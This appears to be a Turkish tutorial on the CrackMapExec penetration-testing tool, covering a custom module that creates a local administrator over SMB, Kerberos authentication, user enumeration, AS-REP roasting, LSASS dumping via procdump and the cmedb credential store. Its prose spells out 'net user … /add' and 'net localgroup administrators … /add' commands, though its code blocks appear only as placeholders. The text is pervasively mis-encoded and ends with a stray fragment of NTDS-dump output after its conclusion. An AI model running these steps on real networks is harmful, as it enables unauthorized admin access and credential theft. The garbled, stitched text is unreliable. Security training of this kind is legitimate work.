* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


 -p '' --ntds

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\DC01$:
SMB 172.16.10.3 445 DC01 [-] RemoteOperations
failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB 172.16.10.3 445 DC01 [+] Dumping the NTDS,
